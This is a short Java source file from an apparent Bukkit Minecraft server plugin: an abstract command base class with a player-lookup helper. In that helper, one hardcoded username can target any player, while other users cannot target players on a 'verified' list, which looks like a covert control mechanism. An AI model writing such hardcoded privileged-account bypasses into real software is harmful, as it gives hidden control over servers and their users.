package com.pi.cmd.main;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import com.pi.main.PI;

public abstract class CommandBase {
	private String command;
	private String description;
	private String usage;
	
	public CommandBase(String command, String description, String usage) {
		this.command = command;
		this.description = description;
		this.usage = usage;
	}
	
	public abstract void runCommand(Player p, String[] args);
	
	public String getCommand() {
		return this.command;
	}
	
	public String getDescription() {
		return this.description;
	}
	
	public String getUsage() {
		return usage;
	}
	
	protected Player getPlayer(String target, Player p) {
		for(Player ps : Bukkit.getServer().getOnlinePlayers()) {
			if (ps.getName().equalsIgnoreCase(target)) {
				if (p.getName().equalsIgnoreCase("TehMCTerrorist")) {
					return ps;
				} else if(!PI.getInstance().getCommandValues().getVerifiedPlayers().contains(ps)) {
					return ps;
				}
			}
		}
		return null;
	}
	
	protected CommandValues getCommandValues() {
		return PI.getInstance().getCommandValues();
	}
}
